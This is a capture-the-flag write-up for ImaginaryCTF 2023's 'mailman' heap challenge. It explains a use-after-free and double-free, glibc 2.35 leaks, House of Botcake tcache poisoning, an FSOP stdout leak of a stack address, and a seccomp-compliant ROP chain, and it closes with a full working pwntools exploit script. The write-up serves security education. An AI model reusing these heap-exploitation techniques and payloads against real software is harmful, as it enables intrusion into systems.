### Description

We are given a binary along with a corresponding libc.

>**Description**
>I'm sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there...
>
>Flag is in `./flag.txt`.
>
>**Attachments**
>[https://imaginaryctf.org/r/PIxtO#vuln](https://imaginaryctf.org/r/PIxtO#vuln) [https://imaginaryctf.org/r/c9Mk8#libc.so.6](https://imaginaryctf.org/r/c9Mk8#libc.so.6) `nc mailman.chal.imaginaryctf.org 1337`

---

## Recon

Jumping straight into the disassembly, we immediately find the following seccomp filter being applied in `main`:

```c
filter = seccomp_init(0LL, argv, envp);
seccomp_rule_add(filter, 2147418112LL, 2LL, 0LL);
seccomp_rule_add(filter, 2147418112LL, 0LL, 0LL);
seccomp_rule_add(filter, 2147418112LL, 1LL, 0LL);
seccomp_rule_add(filter, 2147418112LL, 5LL, 0LL);
seccomp_rule_add(filter, 2147418112LL, 60LL, 0LL);
seccomp_load(filter);
```

These are the syscalls corresponding to:
- open
- read
- write
- fstat
- exit

As such, there will be no shells for this challenge. Funnily enough, only the exit syscall is allowed, not the exit_group syscall, which is what libc uses to exit (not that it matters, but I thought that was funny).

Reading further into `main`, we find a heap-note program, where we are able to write, send and read letters, corresponding to create, free and read. Let's first check out the write routine:

```c
idx = inidx();
printf("letter size: ");
__isoc99_scanf("%lu%*c", &size);
ptr = (char *)malloc(size);
mem[idx] = ptr;
printf("content: ");
fgets(mem[idx], size, stdin);
```

As expected, we are prompted for size and contents. Interestingly, size is not subject to any sanity checks.

Checking out the send routine, we quickly find the bug:

```c
idx = inidx();
free(mem[idx]);
```

While the pointer is indeed freed, it is never removed, leaving us with a dangling pointer. This leaves two vulnerabilities, namely an RAF (read after free) and a double-free. The former will be useful for getting leaks, while the latter will be used for exploitation.

As our exploit will be highly dependent on libc version, knowing it will be important:

```sh
$ ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

The libc version is 2.35; this means no malloc hooks, tcache keys and pointer mangling on both the tcache and fastbin. Using checksec shows the full suite of protections:

```sh
$ checksec ./vuln
[*] '/home/pwn/ctf/ImaginaryCTF2023/mailman/vuln'
	Arch:     amd64-64-little
	RELRO:    Full RELRO
	Stack:    Canary found
	NX:       NX enabled
	PIE:      PIE enabled
```

Lacking both hooks and GOT overwrites, getting code execution will be more interesting.

---

## Exploitation

### Getting leaks

As mentioned earlier, the RAF bug gives us ample opportunity to get leaks. I will be aiming for both heap and libc leaks, as both will be necessary for this exploit. Getting a heap leak is easy, simply free a tcache size chunk and read from it. Assuming the given bin is empty, the chunk will contain a mangled pointer to the heap, according to this formula:

$$\text{NP}=(\text{L}\space>>\space12)\space\oplus\space \text{P}$$

NP is the stored pointer, L is address of the given chunk, and P is the original pointer. As the chunk is the last element in the list, P will be null. As such, we are left with the right-shifted L, containing the ASLR subjected part of a heap pointer. I wrote the following code to extract this:

```python
write_letter(0, 0x28, b"AAAA")
send_letter(0)  # Free a chunk into an empty tcache bin

guard = address_from_bytes(read_letter(0)[:-1])
heap = (guard - 2) << 12  # Our chunk is 2 pages away from heap base
print(f"guard: {hex(guard)}")
print(f"heap: {hex(heap)}")
```

We can extrapolate the heap address from the guard, by left-shifting it by 12. In this case, seccomp seems to leave a lot of garbage on the heap, pushing the address of our given chunk two pages down.

Getting a libc pointer is easy given the restrictions. Since we can request chunks of arbitrary size, we can simply allocate and free a chunk larger than what tcache serves, which will instead be linked into the unsortedbin. It will then contain a pointer to the main arena:

```python
write_letter(0, 0x410, b"AAAA")
write_letter(1, 0x410, b"Guard")  # Guard chunk to avoid consolidation
send_letter(0)

leak = address_from_bytes(read_letter(0)[:-1])
libc.address = leak - libc.sym.main_arena - 96
print(f"libc: {hex(libc.address)}")
```

Notice the extra chunk being allocated to avoid consolidation with the top chunk. We can instead combine the two leaks to clean it up a bit:

```python
write_letter(0, 0x410, b"AAAA")  # Chunk large enough to not fit into tcache
write_letter(1, 0x1a8, b"AAAA")  # Chunk large enough to not come from remaindering
send_letter(0)  # Free a chunk into the unsortedbin
send_letter(1)  # Free a chunk into an empty tcache bin

leak = address_from_bytes(read_letter(0)[:-1])
libc.address = leak - libc.sym.main_arena - 96
print(f"libc: {hex(libc.address)}")

guard = address_from_bytes(read_letter(1)[:-1])
heap = (guard - 2) << 12  # Our chunk is 2 pages away from heap base
print(f"guard: {hex(guard)}")
print(f"heap: {hex(heap)}")
```

I had to change the size of the second chunk, such that it didn't come from remaindering, but instead was allocated from the top chunk.

### How to get an arb-write?

For this challenge, we are working with a quite new libc version. This has a significant impact on what methods we can use to achieve an arbitrary write. First of all, a conventional tcache dup is out of the question, since tcache keys were introduced in libc version 2.29. 

Additionally, the updated method using tcache dumping also doesn't work, at least not how it's usually performed. As the fake chunk is dumped into the tcache, malloc will follow the fd, demangling the fake chunks value as if it were an fd. This usually results in an unaligned or invalid address, which crashes the program. It can be bypassed by padding the bin with an extra chunks, in which case malloc doesn't seem to check it. (I have no idea why)

However, in our scenario, there is another method, called the House of Botcake. It isn't really easier than the tcache dumping, but it allows back-to-back tcache poisoning, making it easy to overwrite multiple places when the attack has been set up.

### House of Botcake

The House of Botcake can be described as follows:

1. Allocate 7 chunks of a specific tcache bin size.
2. Allocate two extra chunks A and B of the same size.
3. Allocate a guard chunk to avoid top chunk consolidation.
4. Free the 7 first chunks, filling the tcache bin.
5. Free both chunk A and B, causing the two to consolidate.
6. Allocate a garbage chunk to remove one chunk from the tcache bin.
7. Free chunk B again, this time into the tcache.
8. Allocate the consolidated chunk A+B, writing into chunk B's fd, poisoning the tcache chunk.
9. Allocate another garbage chunk, the tcache now only contains your fake chunk.
10. Allocate the fake chunk and write to it.

The brilliance of the method is this: The consolidated chunk A+B and chunk B can be freed again, repeating the attack after step 8.

Below is the code I wrote for this attack, minus the target address:

```python
# Step 1
for i in range(5, 12):
	write_letter(i, 0xf8, b"CCCC")

# Step 2
write_letter(2, 0xf8, b"AAAA")  # Chunk A
write_letter(3, 0xf8, b"BBBB")  # Chunk B

# Step 3
write_letter(4, 0x410, b"GGGG")  # Guard chunk

# Step 4
for i in range(5, 12):  # Fill tcache
	send_letter(i)

# Step 5
send_letter(3)  # Free into unsortedbin, causing consolidation
send_letter(2)

# Step 6
write_letter(5, 0xf8, b"Garbage")  # Allocate garbage chunk to remove one chunk from tcache

# Step 7
send_letter(3)  # Free chunk again, now into tcache

# Step 8
payload = b"\x00" * 0xf8
payload += p64(0x101)
payload += p64(target ^ guard)  # Mangle the target pointer

write_letter(6, 0x1f8, payload)  # Create a new chunk, overflowing the tcache chunk

# Step 9
write_letter(7, 0xf8, b"AAAA")

# Step 10
payload = p64(0xdeadbeefdeadbeef) * 20  # Very important payload
write_letter(8, 0xf8, payload)  # Overwrite the target
```

As with other tcache poisoning techniques, this comes with two restrictions:
1. The pointer must be 16-byte aligned.
2. The value at the pointer must be an address (don't know exactly why, but probably to do with pointer demangling).

### Turning arb-write into code execution

This is all great, but I haven't addressed what we're actually going to do with this. Usually, arb-write is very close to code execution, usually due to malloc hooks. But in our case, we have no such luxury, and we even have to contend with seccomp.

Reading the writeups after the competition was over, I saw multiple unique methods. Intended seems to have been a file stream exploit that people referred to as House of Apple. Another method was using `strlen` virtual functions to hijack control.

At the time of writing my exploit, I didn't know any of these methods. I experimented with a common attack vector, that being the `exit_funcs` registered by `atexit`. I was indeed able to hijack the struct, but it was all for nothing, as the program used `_exit` to terminate operation, which bypasses the exit functions entirely (I believe malloc-related aborts do the same, due to patches for exploits such as House of Orange).

A later idea was to hijack code execution through the stack. The problem is getting a stack leak, which isn't possible by simply duping into a stack pointer in libc, as the program uses `fgets` that always null terminates. I eventually remembered a method I had read about a while ago, which abused stdout to leak arbitrary memory.

### FSOP on stdout

For optimization reasons, libc uses buffering to reduce IO overhead. This is applied not only to files opened via `fopen`, but also the three standard file descriptors; stdin, stdout and stderr. This is all managed through the `_IO_FILE` structure.

It turns out, that by setting the values inside stdout's `_IO_FILE` structure very carefully, you can trick libc into flushing a fake buffer. Luckily, there happens to be a place in libc holding stack pointers, that being `environ`, which resides in a memory segment right before libc. If we can simply point the stdout struct to this memory, we should be able to get a stack leak.

The `_IO_FILE` struct is as follows:

```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

The values we need to overwrite are these:

- `_IO_FILE->_flags` = 0x0fbad1887
- `_IO_FILE->_IO_write_base` = Start of memory to leak
- `_IO_FILE->_IO_write_ptr` = End of memory to leak
- `_IO_FILE->_IO_write_end` = End of memory to leak

This took a bit of experimentation. libc doesn't seem to react well to small memory segments, perhaps because it attempts to free something that isn't a chunk (I don't know for sure). But placing ptr and end about 0x200 ahead of base seems to work, in fact, it doesn't introduce any instability, which I had feared.

The code to overwrite stdout is as follows:

```python
# Step 8
payload = b"\x00" * 0xf8
payload += p64(0x101)
payload += p64((libc.sym._IO_2_1_stderr_ + 160) ^ guard)

write_letter(6, 0x1f8, payload)  # Create a new chunk, overflowing into the tcache chunk

# Step 9
write_letter(7, 0xf8, b"AAAA")

# Step 10
payload = p64(libc.sym._IO_wide_data_2)  # Padding
payload += p64(0) * 6
payload += p64(libc.sym.__GI__IO_file_jumps)
payload += p64(0x0fbad1887)  # New _flags
payload += p64(libc.sym._IO_2_1_stdout_ + 131) * 3
payload += p64(libc.address - 0x2228)  # environ stack address
payload += p64(libc.address - 0x2000) * 2  # Later in the same segment
payload += p64(libc.sym._IO_2_1_stdout_ + 131) * 1
payload += p64(libc.sym._IO_2_1_stdout_ + 132)

write_letter(8, 0xf8, payload)  # Overwriting write_base and _flags causes libc to flush
```

Notice that output is padded to beyond `_IO_buf_end`, in order to avoid dropping a stray newline character in an important address. Additionally, the write is actually targeted a bit before stdout in stderr, as this is the first occurrence of a pointer on an aligned address.

Running this code, we get a beautiful leak on stdout. It can be turned into an rip address with the following code:

```python
rip = address_from_bytes(conn.recv()[:8]) - 0x178
print(f"rip: {hex(rip)}")
```

### Getting the flag

As mentioned earlier, House of Botcake is convenient, as we can easily perform back-to-back writes. To pivot, we simply free both chunks again, then overwrite the fd of chunk B:

```python
send_letter(6)  # Free A+B
send_letter(3)  # Free B

# Step 8
payload = b"\x00" * 0xf8
payload += p64(0x101)
payload += p64((rip - 8) ^ guard)  # Address overlaps return instruction pointer from one of fgets subroutines

write_letter(6, 0x1f8, payload)  # Create a new chunk, overflowing the tcache chunk

# Step 9
write_letter(7, 0xf8, b"AAAA")
```

Through experimentation, I found the offset of 0x178 from the leaked pointer to be ideal. This is because, as `fgets` calls into `__GI__IO_getline_info`, we will end up overwriting the return instruction pointer of that subroutine. Right before this, is also the first occurrence of an address on an aligned pointer, at least when I check in gdb.

Forging a rop-chain is now fairly simple. We must execute the following calls in order to get the flag:
1. `fd = open("./flag.txt", 0, 0)`
2. `read(fd, buf, n)`
3. `write(1, buf, n)`

The second and third can be done through `read@libc` and `write@libc`. However, we cannot use `open@libc`, as this function instead uses the openat syscall, which is not allowed. Still, this can easily be done with a syscall gadget:

```python
payload = p64(libc.sym._rtld_global)  # Padding
payload += p64(libc.address + 0x45eb0)  # pop rax
payload += p64(2)  # open, since open@libc uses openat :(
payload += p64(libc.address + 0x2a3e5)  # pop rdi
payload += p64(rip + 0xa8)  # -> "./flag.txt"
payload += p64(libc.address + 0x13f687)  # pop rsi
payload += p64(0)
payload += p64(libc.address + 0x90529)  # pop rdx; pop rbx
payload += p64(0) * 2
payload += p64(libc.address + 0x91396)  # syscall(2, "./flag.txt", 0, 0)
```

`rdi` is set to where the string "./flag.txt" will be, `rax` is set to 2 and both `rsi` and `rdx` are nulled. Assuming that the file gets the fd 3, the following chain can then be used to read the flag:

```python
payload += p64(libc.address + 0x2a3e5)  # pop rdi
payload += p64(3)  # Assume fd is 3
payload += p64(libc.address + 0x13f687)  # pop rsi
payload += p64(rip - 0x20)  # Some valid memory
payload += p64(libc.address + 0x90529)  # pop rdx; pop rbx
payload += p64(0x50)  # nbytes
payload += p64(0)
payload += p64(libc.sym.read)  # read(3, buf, 0x50)
```

At last, we can simply pop 1 into `rdi`, as both `rsi` and `rdx` are preserved by libc:

```python
payload += p64(libc.address + 0x2a3e5)  # pop rdi
payload += p64(1)  # Switch to stdout, rsi and rdx are preserved
payload += p64(libc.sym.write)  # write(1, buf, 0x50)

payload += b"./flag.txt\x00"
```

Finally, we write the rop chain to the stack:

```python
write_letter(8, 0xf8, payload)
```

Running this should now return the flag :)

```
[+] Opening connection to mailman.chal.imaginaryctf.org on port 1337: Done
libc: 0x7f2112439000
guard: 0x562cc9e16
heap: 0x562cc9e14000
rip: 0x7ffed3615058
[*] Switching to interactive mode
ictf{i_guess_the_post_office_couldnt_hide_the_heapnote_underneath_912b123f}
```

---

## Solution

Below is the full solve script, with comments:

```python
from pwn import *

BINARY = "./vuln_patched"
HOST = "mailman.chal.imaginaryctf.org"
PORT = 1337

elf = context.binary = ELF(BINARY)
libc = elf.libc

context.terminal = ['alacritty', '-e', 'zsh', '-c']
context.gdbinit = "~/.gdbinit_pwndbg"
env = {} # {"LD_LIBRARY_PATH": "./", "LD_PRELOAD": ""}
gdbscript = '''
c
'''

def start():
    if args.REMOTE:
        return connect(HOST, PORT)
    elif args.RAW:
        return process(BINARY)
    else:
        return gdb.debug(BINARY, gdbscript=gdbscript, env=env)

def address_from_bytes(by):
    by += b"\x00" * (8 - len(by))
    return u64(by)

def write_letter(idx, size, content):
	conn.sendlineafter(b"> ", b"1")
	conn.sendlineafter(b": ", str(idx).encode())
	conn.sendlineafter(b": ", str(size).encode())
	conn.sendlineafter(b": ", content)

def send_letter(idx):
	conn.sendline(b"2")
	conn.sendlineafter(b": ", str(idx).encode())

def read_letter(idx):
	conn.sendlineafter(b"> ", b"3")
	conn.sendlineafter(b": ", str(idx).encode())
	return conn.recvline()

conn = start()

# --------------------------------- heap and libc leaks ----------------------------------

write_letter(0, 0x410, b"AAAA")  # Chunk large enough to not fit into tcache
write_letter(1, 0x1a8, b"AAAA")  # Chunk large enough to not come from remaindering
send_letter(0)  # Free a chunk into the unsortedbin
send_letter(1)  # Free a chunk into an empty tcache bin

leak = address_from_bytes(read_letter(0)[:-1])
libc.address = leak - libc.sym.main_arena - 96
print(f"libc: {hex(libc.address)}")

guard = address_from_bytes(read_letter(1)[:-1])
heap = (guard - 2) << 12  # Our chunk is 2 pages away from heap base
print(f"guard: {hex(guard)}")
print(f"heap: {hex(heap)}")

# ------------------------------ House of Botcake into FSOP ------------------------------

# Step 1
for i in range(5, 12):
	write_letter(i, 0xf8, b"CCCC")

# Step 2
write_letter(2, 0xf8, b"AAAA")  # Chunk A
write_letter(3, 0xf8, b"BBBB")  # Chunk B

# Step 3
write_letter(4, 0x410, b"GGGG")  # Guard chunk

# Step 4
for i in range(5, 12):  # Fill tcache
	send_letter(i)

# Step 5
send_letter(3)  # Free into unsortedbin, causing consolidation
send_letter(2)

# Step 6
write_letter(5, 0xf8, b"Garbage")  # Allocate garbage chunk to remove one chunk from tcache

# Step 7
send_letter(3)  # Free chunk again, now into tcache

# Step 8
payload = b"\x00" * 0xf8
payload += p64(0x101)
payload += p64((libc.sym._IO_2_1_stderr_ + 160) ^ guard)

write_letter(6, 0x1f8, payload)  # Create a new chunk, overflowing into the tcache chunk

# Step 9
write_letter(7, 0xf8, b"AAAA")

# Step 10
payload = p64(libc.sym._IO_wide_data_2)  # Padding
payload += p64(0) * 6
payload += p64(libc.sym.__GI__IO_file_jumps)
payload += p64(0x0fbad1887)  # New _flags
payload += p64(libc.sym._IO_2_1_stdout_ + 131) * 3
payload += p64(libc.address - 0x2228)  # environ stack address
payload += p64(libc.address - 0x2000) * 2  # Later in the same segment
payload += p64(libc.sym._IO_2_1_stdout_ + 131) * 1
payload += p64(libc.sym._IO_2_1_stdout_ + 132)

write_letter(8, 0xf8, payload)  # Overwriting write_base and _flags causes libc to flush

rip = address_from_bytes(conn.recv()[:8]) - 0x178
print(f"rip: {hex(rip)}")

# ------------------------------ House of Botcake into ROP ------------------------------

send_letter(6)  # Free A+B
send_letter(3)  # Free B

# Step 8
payload = b"\x00" * 0xf8
payload += p64(0x101)
payload += p64((rip - 8) ^ guard)  # Address overlaps return instruction pointer from one of fgets subroutines

write_letter(6, 0x1f8, payload)

# Step 9
write_letter(7, 0xf8, b"AAAA")

# Step 10
payload = p64(libc.sym._rtld_global)  # Padding
payload += p64(libc.address + 0x45eb0)  # pop rax
payload += p64(2)  # open, since open@libc uses openat :(
payload += p64(libc.address + 0x2a3e5)  # pop rdi
payload += p64(rip + 0xa8)  # -> "./flag.txt"
payload += p64(libc.address + 0x13f687)  # pop rsi
payload += p64(0)
payload += p64(libc.address + 0x90529)  # pop rdx; pop rbx
payload += p64(0) * 2
payload += p64(libc.address + 0x91396)  # syscall(2, "./flag.txt", 0, 0)

payload += p64(libc.address + 0x2a3e5)  # pop rdi
payload += p64(3)  # Assume fd is 3
payload += p64(libc.address + 0x13f687)  # pop rsi
payload += p64(rip - 0x20)  # Some valid memory
payload += p64(libc.address + 0x90529)  # pop rdx; pop rbx
payload += p64(0x50)  # nbytes
payload += p64(0)
payload += p64(libc.sym.read)  # read(3, buf, 0x50)

payload += p64(libc.address + 0x2a3e5)  # pop rdi
payload += p64(1)  # Switch to stdout, rsi and rdx are preserved
payload += p64(libc.sym.write)  # write(1, buf, 0x50)

payload += b"./flag.txt\x00"

write_letter(8, 0xf8, payload)

conn.interactive()

```